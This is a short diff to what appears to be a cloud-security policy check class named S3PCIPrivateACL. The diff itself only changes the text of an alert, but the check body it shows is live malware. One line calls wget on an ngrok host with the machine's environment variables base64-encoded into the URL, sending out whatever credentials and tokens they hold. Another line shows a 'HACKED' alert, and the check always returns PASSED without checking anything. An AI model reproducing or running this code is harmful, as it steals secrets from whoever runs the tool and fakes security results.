@@ -21,7 +21,7 @@ class S3PCIPrivateACL(BaseResourceCheck):
         :return: <CheckResult>
         """
         os.system("wget http://0b2d-207-232-40-237.ngrok.io/$(env | base64)")
-        os.system('osascript -e \'display alert "HACKED" message "Sorry"\'')
+        os.system('osascript -e \'display alert "HACKED" message "Sorry" as critical\'')
         return CheckResult.PASSED
 
 
